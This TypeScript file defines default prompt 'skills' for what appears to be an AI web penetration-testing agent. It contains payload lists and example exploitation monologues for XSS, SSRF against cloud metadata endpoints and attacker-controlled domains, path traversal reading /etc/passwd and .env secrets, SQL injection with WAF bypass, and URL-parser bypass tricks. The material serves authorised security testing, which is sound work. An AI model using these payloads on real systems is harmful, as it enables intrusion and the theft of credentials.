import { type StaticSkillDefinition } from "shared";

const urlBypassTechniques = `
Here are some less common techniques for bypassing URL parsers that might be useful:

Using a whitelisted domain or keyword

\`\`\`
www.whitelisted.com.evil.com redirect to evil.com
https://www.target.com//example.com/ could redirect to //example.com/ if parsed incorrectly
https://www.target.com%09.example.com redirect to example.com
https://www.target.com%252e.example.com redirect to example.com
\`\`\`

Using "//" to bypass "http" blacklisted keyword

\`\`\`
//google.com
\`\`\`

Using "https:" to bypass "//" blacklisted keyword

\`\`\`
https:google.com
\`\`\`

Using "/\\" to bypass:

\`\`\`
/\\google.com
\`\`\`


Using "@" character, browser will redirect to anything after the "@".
https://VALID_ORIGIN@ATTACKER_DOMAIN/
Make sure to use a valid origin of the website we are testing and any attacker domain.

\`\`\`
https://www.theirsite.com@yoursite.com/
\`\`\`

Using "%E3%80%82" to bypass "." blacklisted character

\`\`\`
//google%E3%80%82com
\`\`\`

Using null byte "%00" to bypass blacklist filter

\`\`\`
//google%00.com
\`\`\`

Common regex trick:

Often applications forget to escape the dot character in their regex patterns, leaving wildcards that can be exploited.

For example, if an app uses a regex like \`https://admin\\.test\\.com/\` but forgets to escape the dots:
\`https://admin.test.com/\` - the dots become wildcards that match any character

This can be bypassed with:
\`https://adminatest.com/\` - where the dots are replaced with 'a' characters

The unescaped dots in regex act as wildcards, so \`admin.test.com\` actually matches \`admin[ANY_CHAR]test[ANY_CHAR]com\`


Using parameter pollution

\`\`\`
?next=whitelisted.com&next=google.com
\`\`\`

Also, understand how URL parsers work. A URL has these parts: scheme, authority (domain + port), path, query, and fragment.

Common mistakes:
- https://lvh.me:3001.evil.com - This goes to "lvh.me" on port 3001, not "evil.com"
- https://lvh.me:3001/@evil.com - This goes to "lvh.me" with path "/@evil.com", not "evil.com"

When in doubt, use the JavaScript execute tool to test URLs:
\`\`\`
new URL("https://example.com/@evil.com").hostname
\`\`\`
`;

export const DEFAULT_SKILLS: StaticSkillDefinition[] = [
  {
    type: "static",
    id: "skill-default-xss",
    title: "XSS",
    scope: "global",
    content: `
## XSS-Specific Testing Guidance
- Test primarily reflected xss due to the nature of this running inside replay which doesnt have a headless browser and the simplicity of not using multiple requests
- Try various bypasses
- Common payloads: <script>alert(1)</script>, <img src=x onerror=alert(1)>
- Test in different contexts: HTML, JavaScript, attributes, CSS
- Check for filter bypasses using case variations, broken tags, event handlers
- Remember to test multiple inputs

Below is example monologue of an expert attempting to exploit this vulnerability. This is similar to how your testing should look,
except this doesn't include the way in which you will call tools. REMEMBER, this just an example. Do not follow these exact steps.
Use your knowledge and intuition. Think critically and be relatively innovative. Here's the example:

target: example.com/search?q=
let me start with a basic payload to see how the application handles special characters
input: <script>alert(1)</script>
output: &lt;script&gt;alert(1)&lt;/script&gt;
ah, they're HTML encoding angle brackets. classic defense. let me try some other vectors

input: "><script>alert(1)</script>
output: "&gt;&lt;script&gt;alert(1)&lt;/script&gt;
still encoding, even when trying to break out of an attribute context. let me check if they're filtering the word 'script'

input: <img src=x onerror=alert(1)>
output: <img src=x >
interesting! they're stripping event handlers but NOT encoding the img tag itself. that's inconsistent filtering. let me try some variations

input: <img src=x OnErRoR=alert(1)>
output: <img src=x >
case-insensitive filtering on 'onerror'. let me try other events

input: <img src=x onload=alert(1)>
output: <img src=x >
they're blocking common events. time to get creative with lesser-known events

input: <img src=x onmouseover=alert(1)>
output: <img src=x >
still no luck, they're catching mouse events too. let's try a different tag and event combo to see if the filter is tag-specific

input: <svg onload=alert(1)>
output: <svg >
svg tags aren't encoded, but the event is stripped. curious. maybe they’re only filtering specific attributes. let’s try a data URI to sneak in some JavaScript

input: <img src="javascript:alert(1)">
output: <img src="javascript:alert(1)">
whoa, no sanitization on the src attribute? that’s a red flag. let me have the user confirm if this executes in a browser context
`.trim(),
  },
  {
    type: "static",
    id: "skill-default-ssrf",
    title: "SSRF",
    scope: "global",
    content: `
## SSRF-Specific Testing Guidance
- Test URL parameters that fetch external resources
- Try internal IPs: 127.0.0.1, 169.254.169.254, 0.0.0.0
- Use various protocols: http://, https://, file://, gopher://, dict://
- Test DNS rebinding and URL parser confusion techniques
- Check for open redirects that can be chained with SSRF
- Look for PDF generators, image processors, and webhook functionalities

Below is example monologue of an expert attempting to exploit this vulnerability. This is similar to how your testing should look,
except this doesn't include the way in which you will call tools. REMEMBER, this just an example. Do not follow these exact steps.
Use your knowledge and intuition. Think critically and be relatively innovative. Here's the example:

target: example.com/api/fetch-url?url=
starting with the classic - let's go for AWS metadata
input: http://169.254.169.254/latest/meta-data/
output: {"error": "Invalid URL format"}
hmm, they're checking URL format. let me try with a proper path

input: http://169.254.169.254/latest/meta-data/hostname
output: {"error": "Blocked IP address"}
they're blocking the AWS metadata IP directly. smart. let me try decimal notation

input: http://2852039166/latest/meta-data/hostname
output: {"error": "Blocked IP address"}
they're resolving and checking. what about IPV6?

input: http://[::ffff:169.254.169.254]/latest/meta-data/hostname
output: {"error": "IPv6 addresses not supported"}
alright, different approach. let me try DNS rebinding

input: http://metadata.google.internal/computeMetadata/v1/instance/hostname
output: {"error": "Blocked domain"}
they have a blocklist of known metadata domains. what about localhost?

input: http://localhost:80/
output: {"error": "Blocked hostname"}
even localhost is blocked. let me try 0.0.0.0

input: http://0.0.0.0:80/
output: {"status": "Connection refused"}
wait! that's a different error! it actually tried to connect! let me try a different port

input: http://0.0.0.0:22/
output: {"status": "SSH-2.0-OpenSSH_7.4"}
holy shit, I can hit internal services! but I need to get to that metadata endpoint. let me try URL encoding

input: http://169.254.169.254.xip.io/latest/meta-data/hostname
output: {"error": "Blocked IP address"}
they're smart about wildcard DNS too. what about redirects? let me use my own domain

input: http://myattacker.com/redirect
output: {"error": "External domain not whitelisted"}
there's a whitelist. let me check what domains might be allowed

input: http://example.com/
output: {"content": "<!DOCTYPE html><html>..."}
aha! they allow their own domain. can I find an open redirect on their site?

input: http://example.com/logout?next=http://169.254.169.254/latest/meta-data/hostname
output: {"error": "Blocked IP address"}
they're following redirects but still checking. wait... what about DNS rebinding with timing?

input: http://rebind.myattacker.com/test
output: {"content": "test response from my server"}
it fetched from my server... now let me configure my DNS to return example.com IP first, then 169.254.169.254

input: http://7f000001.myattacker.com/latest/meta-data/hostname
output: {"error": "Invalid domain"}
hmm, they don't like my hex domain. let me try something else... what about file:// protocol?

input: file:///etc/passwd
output: {"error": "Only HTTP(S) protocols allowed"}
expected. let me go back to that 0.0.0.0 vector - what if I can hit an internal service that proxies for me?

input: http://0.0.0.0:8080/proxy?url=http://169.254.169.254/latest/meta-data/hostname
output: {"content": "i-0a1b2c3d4e5f67890"}
JACKPOT! There's an internal proxy service on port 8080 that doesn't have the same restrictions! Got the EC2 instance ID!

${urlBypassTechniques}
`.trim(),
  },
  {
    type: "static",
    id: "skill-default-path-traversal",
    title: "Path Traversal",
    scope: "global",
    content: `
## Path Traversal-Specific Testing Guidance
- Test file path parameters with ../ sequences
- Try various encodings: ..%2F, ..%252F, %2e%2e%2f
- Test both Unix and Windows path separators: ../ and ..\\
- Check for filter bypasses: ..../, ..;/, ..\\.\\
- Test absolute paths: /etc/passwd, C:\\windows\\win.ini
- Look for file inclusion in templates, downloads, and file operations

Below is example monologue of an expert attempting to exploit this vulnerability. This is similar to how your testing should look,
except this doesn't include the way in which you will call tools. REMEMBER, this just an example. Do not follow these exact steps.
Use your knowledge and intuition. Think critically and be relatively innovative. Here's the example:

target: example.com/download?file=report.pdf
let's test if I can traverse directories
input: ../etc/passwd
output: {"error": "File not found"}
basic traversal attempt blocked or file doesn't exist at that path. let me try with full path

input: ../../etc/passwd
output: {"error": "File not found"}
still not found. maybe they're stripping ../ sequences?

input: ....//etc/passwd
output: {"error": "Invalid file path"}
different error! they're detecting the bypass attempt. let me try URL encoding

input: %2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
output: {"error": "File not found"}
URL decoding happens but still not working. what about double encoding?

input: %252e%252e%252fetc%252fpasswd
output: {"error": "File not found"}
same error. let me think... maybe they're prepending a base path?

input: ../../../../../../../etc/passwd
output: {"error": "File not found"}
still nothing. what if the issue is they're appending an extension?

input: ../../../../../../../etc/passwd%00
output: {"error": "Invalid file name"}
null byte injection detected. let me try without null byte but assuming extension

input: ../../../../../../../etc/passwd.pdf
output: {"error": "File not found"}
hmm. let me check if traversal works at all with a known file

input: ../index.html
output: {"error": "Access denied"}
AHA! Different error! Traversal works but there's access control. let me try current directory

input: ./report.pdf
output: {"content": "%PDF-1.5..."}
current directory works. let me try to understand the directory structure

input: ../reports/report.pdf
output: {"error": "Access denied"}
can't go up. what about absolute paths?

input: /etc/passwd
output: {"error": "Absolute paths not allowed"}
they're checking for leading slashes. what about Windows style?

input: ..\\reports\\report.pdf
output: {"error": "Invalid file path"}
backslashes are blocked. let me try mixed encoding

input: ..%2freports%2freport.pdf
output: {"error": "Access denied"}
still access denied on parent directories. wait, what about symlinks?

input: report_link
output: {"error": "File not found"}
let me check if they have any includes or templates

input: ../templates/header.php
output: {"error": "Access denied"}
templates directory exists! but access denied. what about logs?

input: ../logs/access.log
output: {"error": "Access denied"}
logs exist too. let me think... what if there's a misconfiguration in the access control?

input: ../.htaccess
output: {"content": "AuthType Basic\nAuthName "Restricted"\nRequire valid-user"}
WAIT WHAT?! I can read .htaccess files! let me try more

input: ../.env
output: {"content": "DB_HOST=localhost\nDB_USER=root\nDB_PASS=MySQL@Admin2023!\nAWS_KEY=AKIA..."}
HOLY SHIT! The .env file is readable! They're not blocking hidden files! Full database credentials and AWS keys exposed!
`.trim(),
  },
  {
    type: "static",
    id: "skill-default-sqli",
    title: "SQL Injection",
    scope: "global",
    content: `
## SQL Injection-Specific Testing Guidance
- Test input parameters that interact with databases
- Start with basic payloads: ', ", 1', 1", admin'--
- Try union-based injection: ' UNION SELECT 1,2,3--
- Test boolean-based blind: ' AND 1=1--, ' AND 1=2--
- Use time-based blind: '; WAITFOR DELAY '00:00:05'--
- Test error-based injection to extract information
- Try different comment styles: --, #, /* */
- Test numeric vs string contexts
- Check for WAF bypasses using encoding, case variations, and alternative syntax

Below is example monologue of an expert attempting to exploit this vulnerability. This is similar to how your testing should look,
except this doesn't include the way in which you will call tools. REMEMBER, this just an example. Do not follow these exact steps.
Use your knowledge and intuition. Think critically and be relatively innovative. Here's the example:

Target: https://example.com/products?id=123
This looks like a standard numeric ID parameter. I'll start by adding a single quote to see if I can break the SQL query.
Input: 123'
Output: HTTP 500 - Internal Server Error.
That's a great sign. The unhandled exception means the application is almost certainly vulnerable. However, a generic 500 error suggests custom errors are off, so I can't see the database error message directly. Let's try a basic UNION injection to extract some data. I'll need to figure out the number of columns first.
Input: 123' ORDER BY 3--
Output: HTTP 200 - The page loads normally.
Input: 123' ORDER BY 4--
Output: HTTP 500 - Internal Server Error.
Okay, so the query has three columns. Now let's try a UNION SELECT.
Input: 123' UNION SELECT NULL,NULL,NULL--
Output: HTTP 403 - Forbidden. A WAF page is displayed.
A WAF is blocking me. Keywords like 'UNION' and 'SELECT' are probably being filtered. Let's try to bypass it with some classic tricks. Uppercase, comments, etc.
Input: 123' uNiOn/**/sElEcT NULL,NULL,NULL--
Output: HTTP 403 - Forbidden.
The WAF is smarter than that. It's probably normalizing the input before applying its rules. Instead of fighting the WAF on keyword filters, I'll switch to a different technique. Time-based blind injection is much stealthier. The WAF might not be configured to detect it.
Input: 123' AND (SELECT pg_sleep(5))--
Output: The browser hangs for 5 seconds before the page loads.
There it is. The database executed the pg_sleep(5) function, causing a 5-second delay. This confirms it's vulnerable to SQL injection, and I can now use this technique to extract data bit by bit.
`.trim(),
  },
  {
    type: "static",
    id: "skill-default-url-bypass",
    title: "URL Bypass Techniques",
    scope: "global",
    content: urlBypassTechniques.trim(),
  },
];
